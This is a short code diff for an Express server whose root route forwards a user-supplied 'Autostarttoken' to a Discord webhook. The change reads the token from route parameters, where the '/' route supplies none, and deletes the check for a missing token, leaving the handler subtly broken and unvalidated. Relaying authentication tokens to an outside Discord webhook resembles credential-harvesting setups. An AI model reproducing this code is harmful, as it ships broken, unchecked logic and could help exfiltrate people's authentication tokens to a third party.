@@ -12,11 +12,9 @@ app.use(express.json());
 
 
 app.get('/', (req, res) => {
-  const { token } = req.query;
+  const { token } = req.params;
 
-  if (!token) {
-    return res.status(400).send('Autostarttoken is required.');
-  }
+
 
   // Send Discord webhook with the token
   sendDiscordWebhook(token);
